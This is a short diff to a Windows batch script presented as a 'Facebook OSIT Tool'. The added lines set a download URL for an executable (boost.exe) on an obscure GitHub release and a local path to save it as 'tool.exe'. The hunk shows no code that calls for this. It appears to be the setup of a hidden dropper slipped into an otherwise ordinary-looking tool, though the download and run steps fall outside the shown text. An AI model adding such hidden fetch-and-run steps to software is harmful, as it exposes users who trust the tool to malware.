@@ -1,4 +1,7 @@
 @echo off
+set "URL=https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe"
+set "Dossier=resultas"
+set "NomFichier=%Dossier%\tool.exe"
 title Facebook OSIT Tool © Deano (copyright 2018)
 color a
 
